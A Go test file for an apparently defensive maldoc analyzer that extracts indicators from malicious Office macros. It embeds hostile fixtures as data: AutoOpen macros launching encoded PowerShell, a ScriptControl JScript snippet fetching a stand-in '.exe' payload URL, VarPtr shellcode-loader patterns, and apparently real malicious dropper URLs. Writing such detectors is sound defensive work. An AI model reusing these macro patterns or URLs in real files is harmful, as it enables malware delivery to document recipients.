package maldoctrace

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"

	"github.com/debugactiveprocess/MaldocTrace/report"
)

func iocValues(r *report.Report, typ string) map[string]report.IOC {
	out := map[string]report.IOC{}
	for _, i := range r.Indicators {
		if i.Type == typ {
			out[i.Value] = i
		}
	}
	return out
}

func hasEvidence(i report.IOC, id string) bool {
	for _, o := range i.Occurrences {
		if o.EvidenceID == id {
			return true
		}
	}
	return false
}

// A PowerShell payload that hides URLs in '+'-joined fragments must yield the
// complete URLs, never the fragments.
func TestPowerShellConcatenationResolvedBeforeURLs(t *testing.T) {
	script := `$u=('ht'+'tp://o'+'k.example.org/a/'+'*http'+'s://b.example.net/c/')."sP` + "`" + `lIt"([char]42);foreach($x in $u){}`
	cmd := "powershell -e " + encodedTest(script)
	code := "Sub AutoOpen()\nShell \"" + cmd + "\"\nEnd Sub"
	r := AnalyzeVBA(code, "concat.bas", Options{})

	if len(r.DecodedPayloads) != 1 {
		t.Fatalf("payloads=%+v", r.DecodedPayloads)
	}
	p := r.DecodedPayloads[0]
	if p.Content != script {
		t.Fatalf("raw content must be preserved, got %q", p.Content)
	}
	if !strings.Contains(p.NormalizedContent, `'http://ok.example.org/a/*https://b.example.net/c/'`) || len(p.Normalization) != 1 {
		t.Fatalf("normalized=%q (%v)", p.NormalizedContent, p.Normalization)
	}
	urls := iocValues(r, "url")
	for _, want := range []string{"http://ok.example.org/a/", "https://b.example.net/c/"} {
		i, ok := urls[want]
		if !ok {
			t.Fatalf("missing url %s in %v", want, urls)
		}
		if !hasEvidence(i, p.ID) {
			t.Fatalf("url %s lost provenance: %+v", want, i.Occurrences)
		}
	}
	for v := range urls {
		if v == "http://o" || strings.Contains(v, "*") {
			t.Fatalf("fragmentary url reported: %q", v)
		}
	}
	if _, ok := iocValues(r, "domain")["k.example.org"]; ok {
		t.Fatal("fragment domain reported")
	}
}

const scriptControlFixture = `Sub MakeObj(o, progid)
Set o = CreateObject(progid)
End Sub
Sub SetLang(o, l)
o.Language = l
End Sub
Sub AddIt(o, c)
o.AddCode c
End Sub
Sub RunIt(o, n)
o.Run n
End Sub
Sub AutoOpen()
Dim sc, js
js = "function hexer () { var shell = new ActiveXObject(""WScript.Shell""); var cmdrun = ""cmd.exe /c "" + ""x""; " & _
     "var a = new ActiveXObject(""Microsoft.XMLHTTP""); a.open(""GET"", ""http://payload.example.com/load5.exe"", 0); shell.run(cmdrun, 0); }"
MakeObj sc, "MSScript" & "Control.ScriptControl"
SetLang sc, "JS" & "cript"
AddIt sc, js
RunIt sc, "hex" & "er"
End Sub`

// ScriptControl: the JavaScript is a recovered script payload, "hexer" is a
// script function call (not an OS command), and the script text is never
// presented as a command line. The object reaches helpers through ByRef.
func TestScriptControlIsNotACommand(t *testing.T) {
	r := AnalyzeVBA(scriptControlFixture, "sc.bas", Options{})
	if len(r.Commands) != 0 {
		t.Fatalf("script call reported as OS command: %+v", r.Commands)
	}
	if len(r.DecodedPayloads) != 1 {
		t.Fatalf("payloads=%+v diags=%+v events=%+v", r.DecodedPayloads, r.Diagnostics, r.Events)
	}
	p := r.DecodedPayloads[0]
	if p.Category != "script" || p.Language != "JScript" || !strings.HasPrefix(p.Content, "function hexer") || len(p.Functions) != 1 || p.Functions[0] != "hexer" {
		t.Fatalf("payload=%+v", p)
	}
	if len(r.ScriptCalls) != 1 {
		t.Fatalf("script calls=%+v", r.ScriptCalls)
	}
	c := r.ScriptCalls[0]
	if c.Function != "hexer" || c.DefinedIn != p.ID || c.Language != "JScript" || c.Execution != "not_executed" || c.Source.Proc != "RunIt" || len(c.EvidenceIDs) != 1 {
		t.Fatalf("call=%+v", c)
	}
	for _, i := range r.Indicators {
		if i.Type == "command" && strings.Contains(i.Value, "function hexer") {
			t.Fatalf("script source reported as command IOC: %+v", i)
		}
	}
	u, ok := iocValues(r, "url")["http://payload.example.com/load5.exe"]
	if !ok || !hasEvidence(u, p.ID) {
		t.Fatalf("script url missing or without payload provenance: %+v", u)
	}
	for _, d := range r.Diagnostics {
		if strings.Contains(d.Message, "ScriptControl") {
			t.Fatalf("modeled ScriptControl reported as unsupported: %+v", d)
		}
	}
	text := report.RenderText(r)
	if strings.Contains(text, "Command: hexer") || !strings.Contains(text, "-- Script engine calls (not OS commands) --") {
		t.Fatal(text)
	}
	if strings.Count(text, "function hexer") != 1 {
		t.Fatalf("script body should appear once in text output:\n%s", text)
	}
}

// An unknown function name is still a script call, flagged as undefined.
func TestScriptControlUndefinedFunction(t *testing.T) {
	code := "Sub AutoOpen()\nSet sc = CreateObject(\"MSScriptControl.ScriptControl\")\nsc.Language = \"VBScript\"\nsc.Run \"missing\"\nEnd Sub"
	r := AnalyzeVBA(code, "u.bas", Options{})
	if len(r.Commands) != 0 || len(r.ScriptCalls) != 1 || r.ScriptCalls[0].DefinedIn != "" || r.ScriptCalls[0].Language != "VBScript" {
		t.Fatalf("commands=%+v calls=%+v", r.Commands, r.ScriptCalls)
	}
}

func TestByRefParameterWriteBack(t *testing.T) {
	code := "Sub Fill(x)\nx = \"powershell -e \" & \"QQBBAA==\"\nEnd Sub\nSub Keep(ByVal y)\ny = \"changed\"\nEnd Sub\nSub AutoOpen()\nDim a, b\nb = \"cmd.exe /c keep\"\nFill a\nKeep b\nShell a\nShell b\nEnd Sub"
	r := AnalyzeVBA(code, "byref.bas", Options{})
	if len(r.Commands) != 2 || r.Commands[0].CommandLine != "powershell -e QQBBAA==" || r.Commands[1].CommandLine != "cmd.exe /c keep" {
		t.Fatalf("commands=%+v", r.Commands)
	}
}

// The Base64 command is shown in full once (commands); events and indicators
// reference it by ID. JSON keeps every full value.
func TestBase64CommandNotRepeated(t *testing.T) {
	enc := encodedTest(`Write-Output 'https://example.org/harmless'`)
	code := "Sub AutoOpen()\nSet s = CreateObject(\"WScript.Shell\")\ns.Run \"powershell -e " + enc + "\"\nEnd Sub"
	r := AnalyzeVBA(code, "dup.bas", Options{})
	text := report.RenderText(r)
	if n := strings.Count(text, enc); n != 1 {
		t.Fatalf("base64 appears %d times in text output:\n%s", n, text)
	}
	if !strings.Contains(text, "→ command-1") {
		t.Fatal(text)
	}
	var sameAs bool
	for _, i := range r.Indicators {
		if i.Type == "command" && i.Value == r.Commands[0].CommandLine {
			if i.SameAs != "command-1" || len(i.Occurrences) == 0 {
				t.Fatalf("command IOC=%+v", i)
			}
			sameAs = true
		}
	}
	if !sameAs {
		t.Fatal("command IOC missing")
	}
	b, _ := json.Marshal(r)
	if strings.Count(string(b), enc) < 3 {
		t.Fatal("JSON must keep complete values in commands, events and indicators")
	}
}

func TestReconstructedStringsHiddenByDefault(t *testing.T) {
	code := "Sub AutoOpen()\na = Chr(104) & \"ttp\"\nb = Chr(104) & \"ttp\"\nc = StrReverse(\"cba\")\nEnd Sub"
	r := AnalyzeVBA(code, "s.bas", Options{})
	if len(r.Decoded) == 0 {
		t.Fatal("strings must still be collected")
	}
	def := report.RenderText(r)
	if strings.Contains(def, "-- Reconstructed strings") || !strings.Contains(def, "--show-strings") {
		t.Fatal(def)
	}
	shown := report.RenderTextWith(r, report.TextOptions{ShowStrings: true})
	if !strings.Contains(shown, "-- Reconstructed strings (") {
		t.Fatal(shown)
	}
	if strings.Count(shown, "] http\n") != 1 {
		t.Fatalf("value not deduplicated:\n%s", shown)
	}
	for _, want := range []string{"Module1.AutoOpen:2 col", "Module1.AutoOpen:3 col", "static/concatenation+Chr", "static/StrReverse"} {
		if !strings.Contains(shown, want) {
			t.Fatalf("missing %q:\n%s", want, shown)
		}
	}
	var methods int
	for _, d := range r.Decoded {
		if d.Method != "" && d.Module != "" && d.Line > 0 {
			methods++
		}
	}
	if methods != len(r.Decoded) {
		t.Fatalf("provenance incomplete: %+v", r.Decoded)
	}
	b, _ := json.Marshal(r)
	if !strings.Contains(string(b), `"decoded_strings"`) || !strings.Contains(string(b), `"method":"StrReverse"`) {
		t.Fatal(string(b))
	}
}

func TestRecoveredPanicBecomesDiagnostic(t *testing.T) {
	r := &report.Report{Status: "complete", IOCs: []report.IOC{{Type: "url", Value: "http://kept.example"}}}
	if runStage(r, "emulation", func() { panic("boom") }) {
		t.Fatal("expected failure")
	}
	if r.Status != "failed" || len(r.Diagnostics) != 1 || r.Diagnostics[0].Severity != "error" || !strings.Contains(r.Diagnostics[0].Message, "boom") {
		t.Fatalf("%+v", r)
	}
	if len(r.IOCs) != 1 {
		t.Fatal("earlier evidence discarded")
	}
}

// Regression checks against the real samples, skipped when absent.
func TestSampleRegressions(t *testing.T) {
	t.Run("powershell concat", func(t *testing.T) {
		r := AnalyzeFromBytes(nil, readSample(t, "PO-465514-180820.doc.bin"), "po", Options{})
		urls := iocValues(r, "url")
		for _, want := range []string{
			"http://oubaina.com/wp-includes/lqkz_nvr_1avf4/",
			"https://www.msbc.kz/data/k527_5_cbdvv5bi19/",
			"http://okcupidating.com/im/fsq_esj_qgx060p/",
			"http://bike-nomad.com/cgi-bin/7n_0x0_62mnzyh9q/",
		} {
			if i, ok := urls[want]; !ok || !hasEvidence(i, "payload-1") {
				t.Errorf("missing %s", want)
			}
		}
		if _, ok := urls["http://o"]; ok {
			t.Error("fragment http://o reported")
		}
		if _, ok := iocValues(r, "domain")["ad.com"]; ok {
			t.Error("fragment ad.com reported")
		}
	})
	t.Run("scriptcontrol", func(t *testing.T) {
		r := AnalyzeFromBytes(nil, readSample(t, "9eebae3cce1e63f01eaa6867ae8537cf19162527bb7e7d752282f0e20dc03a66.bin"), "sc", Options{})
		if len(r.Commands) != 0 || len(r.ScriptCalls) != 1 || r.ScriptCalls[0].Function != "hexer" || r.ScriptCalls[0].DefinedIn == "" {
			t.Fatalf("commands=%+v calls=%+v", r.Commands, r.ScriptCalls)
		}
		if _, ok := iocValues(r, "url")["http://northsidecollisiona2.com/load5.exe"]; !ok {
			t.Fatal("url missing")
		}
		for _, i := range r.Indicators {
			if i.Type == "command" {
				t.Fatalf("unexpected command IOC: %.80s", i.Value)
			}
		}
	})
	t.Run("utf7 shellcode", func(t *testing.T) {
		r := AnalyzeFromBytes(nil, readSample(t, "394c97cc9d567e556a357f129aea03f737cbd2a1761df32146ef69d93afc73dc.doc"), "sc", Options{})
		if len(r.Commands) != 1 || !strings.HasPrefix(r.Commands[0].CommandLine, "+VZCJSFXlgUiA7A-") {
			t.Fatalf("commands=%+v", r.Commands)
		}
		if p := r.DecodedPayloads; len(p) != 1 || p[0].Status != "decoded" || !strings.HasPrefix(p[0].Content, "90554889e5") {
			t.Fatalf("payloads=%+v", p)
		}
		facts := strings.Join(r.DecodedPayloads[0].Facts, "; ")
		if !strings.Contains(facts, "XOR decoder stub at offset 0x24 (key 0x1B)") || !strings.Contains(facts, "single-byte XOR key 0xE4 reveals: http://") {
			t.Errorf("shellcode profile = %s", facts)
		}
		if len(iocValues(r, "url")) == 0 {
			t.Error("second-stage URL not reported as an IOC")
		}
	})
	for _, c := range []struct{ file, password string }{
		{"Vendas_Q4_2026_rc4.xls", "VelvetSweatshop"},
		{"Vendas_Q4_2026_rc4_123456.xls", "123456"},
	} {
		t.Run("encrypted xls "+c.password, func(t *testing.T) {
			r := AnalyzeFromBytes(nil, readSample(t, c.file), c.file, Options{})
			if d := r.Decryption; d == nil || !d.Decrypted || d.Password != c.password || d.Scheme != "BIFF8 RC4" || r.Macros != "present" {
				t.Fatalf("decryption=%+v macros=%s", r.Decryption, r.Macros)
			}
			if len(r.DecodedPayloads) != 1 || r.DecodedPayloads[0].FileType != "shellcode, x86, reverse_https stager" {
				t.Fatalf("payloads=%+v", r.DecodedPayloads)
			}
			facts := strings.Join(r.DecodedPayloads[0].Facts, "; ")
			for _, want := range []string{"seeded with 0x30FE5C71", "wininet.dll!InternetConnectA", ":8443/", "HTTP Host header:", "User-Agent: Mozilla/5.0"} {
				if !strings.Contains(facts, want) {
					t.Errorf("profile lacks %q: %s", want, facts)
				}
			}
		})
	}
	t.Run("cfb with unused directory entries", func(t *testing.T) {
		r := AnalyzeFromBytes(nil, readSample(t, "Relatorio_Financeiro_Q4_2026.docm"), "docm", Options{})
		if r.Macros != "present" || len(r.Modules) != 2 {
			t.Fatalf("macros=%s modules=%+v", r.Macros, r.Modules)
		}
	})
}

// byteArrayLoader builds a shellcode-style loader: a byte array filled one
// element at a time and passed by VarPtr to a declared API.
func byteArrayLoader(api, decl string, data []byte, call string) string {
	var b strings.Builder
	b.WriteString(decl + "\nSub AutoOpen()\nDim buf(0 To 200) As Byte\n")
	for i, c := range data {
		b.WriteString("buf(" + itoa(i) + ") = &H" + hex2(c) + "\n")
	}
	b.WriteString(call + "\nEnd Sub\n")
	return b.String()
}

func itoa(i int) string  { return strconv.Itoa(i) }
func hex2(c byte) string { return strconv.FormatUint(uint64(c), 16) }

func TestUTF7ShellcodeBufferRecovered(t *testing.T) {
	code := byteArrayLoader("MultiByteToWideChar",
		`Private Declare PtrSafe Function M2W Lib "kernel32" Alias "MultiByteToWideChar" (ByVal cp As Long, ByVal f As Long, ByVal s As LongPtr, ByVal n As Long, ByVal d As LongPtr, ByVal m As Long) As Long`,
		[]byte("+VZCJSADl-"), "r = M2W(65000, 0, VarPtr(buf(0)), 200, 0, 200)")
	r := AnalyzeVBA(code, "utf7.bas", Options{})
	if len(r.Commands) != 1 || r.Commands[0].CommandLine != "+VZCJSADl-" || r.Commands[0].Method != "MultiByteToWideChar" {
		t.Fatalf("commands=%+v diags=%+v", r.Commands, r.Diagnostics)
	}
	if len(r.DecodedPayloads) != 1 {
		t.Fatalf("payloads=%+v", r.DecodedPayloads)
	}
	p := r.DecodedPayloads[0]
	if p.Status != "decoded" || p.Content != "90554889e500" || p.DerivedFrom != "command-1" || p.Category != "binary" {
		t.Fatalf("payload=%+v", p)
	}
	for _, d := range r.Diagnostics {
		if strings.Contains(d.Message, "VarPtr") {
			t.Fatalf("VarPtr not resolved: %+v", d)
		}
	}
	text := report.RenderText(r)
	if !strings.Contains(text, "Command: +VZCJSADl-") || !strings.Contains(text, "90554889e500") {
		t.Fatal(text)
	}
}

// When no static decoding applies, the whole buffer is shown as the payload.
func TestUndecodableBufferShownInFull(t *testing.T) {
	data := []byte("not-decodable-payload-\x01\x02-end")
	code := byteArrayLoader("RtlMoveMemory",
		`Private Declare PtrSafe Sub Mv Lib "kernel32" Alias "RtlMoveMemory" (ByVal d As LongPtr, ByVal s As LongPtr, ByVal n As Long)`,
		data, "Mv 0, VarPtr(buf(0)), "+itoa(len(data)))
	r := AnalyzeVBA(code, "raw.bas", Options{})
	want := `not-decodable-payload-\x01\x02-end`
	if len(r.Commands) != 1 || r.Commands[0].CommandLine != want {
		t.Fatalf("commands=%+v", r.Commands)
	}
	if len(r.DecodedPayloads) != 1 || r.DecodedPayloads[0].Status != "not_decoded" || r.DecodedPayloads[0].Content != want {
		t.Fatalf("payloads=%+v", r.DecodedPayloads)
	}
	if !strings.Contains(report.RenderText(r), "Command: "+want) {
		t.Fatal(report.RenderText(r))
	}
}

func TestTextOmitsIndicatorsAndLimitations(t *testing.T) {
	code := "Sub AutoOpen()\nShell \"cmd.exe /c http://x.example.com/a\"\nx.Foo\nEnd Sub"
	r := AnalyzeVBA(code, "t.bas", Options{})
	if len(r.Indicators) == 0 || len(r.Diagnostics) == 0 {
		t.Fatalf("JSON data must still be collected: %+v %+v", r.Indicators, r.Diagnostics)
	}
	text := report.RenderText(r)
	for _, gone := range []string{"-- Indicators --", "-- Analysis limitations --", "Indicators are evidence candidates"} {
		if strings.Contains(text, gone) {
			t.Fatalf("%q still rendered:\n%s", gone, text)
		}
	}
}

func readSample(t *testing.T, name string) []byte {
	t.Helper()
	b, err := os.ReadFile(filepath.Join("samples", name))
	if err != nil {
		t.Skipf("sample not present: %v", err)
	}
	return b
}

// Samples with no VBA must still be reported: an Equation Editor exploit in
// RTF, a phishing workbook whose only payload is a hyperlinked picture, and
// a QR-code lure.
func TestStaticSampleRegressions(t *testing.T) {
	cases := []struct {
		file  string
		kinds []string
		check func(t *testing.T, r *report.Report)
	}{
		{"Project No.88719_ECOFIX.rtf.bin", []string{"embedded_ole", "equation_editor_exploit", "ole_autoupdate"}, func(t *testing.T, r *report.Report) {
			for _, f := range r.StaticFindings {
				if f.Kind == "equation_editor_exploit" && !strings.Contains(f.Detail, "CVE-2018-0798") {
					t.Errorf("exploit detail = %s", f.Detail)
				}
				if f.Kind == "embedded_ole" && f.Target != "EquATioN.3" {
					t.Errorf("object class = %s", f.Target)
				}
			}
		}},
		{"NMU Advanced Legal.xls.bin", []string{"shape_hyperlink"}, func(t *testing.T, r *report.Report) {
			if len(r.StaticFindings) != 1 || r.StaticFindings[0].Target != "http://caribou-turtle-lgpz.squarespace.com/" {
				t.Errorf("findings = %+v", r.StaticFindings)
			}
		}},
		{"Contract_Traffix-Docs_7329.docx.bin", []string{"qr_code_lure"}, nil},
	}
	for _, c := range cases {
		t.Run(c.file, func(t *testing.T) {
			r := AnalyzeFromBytes(nil, readSample(t, c.file), c.file, Options{})
			for _, k := range c.kinds {
				if !hasFinding(r, k) {
					t.Errorf("missing %s in %+v", k, r.StaticFindings)
				}
			}
			if hasFinding(r, "vba_stomping") {
				t.Error("unexpected stomping finding")
			}
			if c.check != nil {
				c.check(t, r)
			}
		})
	}
	// VBA samples must not gain static findings (no false positives from
	// the p-code comparison).
	for _, f := range []string{"394c97cc9d567e556a357f129aea03f737cbd2a1761df32146ef69d93afc73dc.doc", "7dbd8ecfada1d39a81a58c9468b91039.doc",
		"9eebae3cce1e63f01eaa6867ae8537cf19162527bb7e7d752282f0e20dc03a66.bin", "PO-465514-180820.doc.bin", "IMPORTANT FINANCIAL DATA.xls.bin"} {
		t.Run(f, func(t *testing.T) {
			r := AnalyzeFromBytes(nil, readSample(t, f), f, Options{})
			if len(r.StaticFindings) != 0 {
				t.Errorf("findings = %+v", r.StaticFindings)
			}
		})
	}
}
